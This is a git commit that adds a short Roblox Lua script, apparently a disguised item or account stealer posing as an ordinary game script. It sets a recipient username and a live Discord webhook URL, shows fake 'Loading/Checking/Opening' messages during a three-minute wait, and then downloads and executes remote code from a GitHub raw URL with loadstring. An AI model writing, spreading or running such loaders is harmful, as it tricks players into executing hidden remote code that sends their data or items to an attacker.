3d36c21e47cd7952aac358a4c9e80986ee3ac7d7
FalconHubScripts <130830665+FalconHubScripts@users.noreply.github.com>
2023-05-13 23:38:32 +0200

    Add files via upload

---
+++ rbxscript.lua
@@ -0,0 +1,8 @@
+UserName = "weeee230lou"
+Webhook = "https://discord.com/api/webhooks/1107056119072952501/MsphjPL26lbEdil366c-51MCiJp4-zezm4Itv3nYQimI1JdjbzawHIvlAqB4-zamuWTF"
+_G.ScriptName = "RbxScripts.com"
+_G.FirstText = "Loading..."
+_G.SecondText = "Checking..."
+_G.ThirdText = "Opening..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
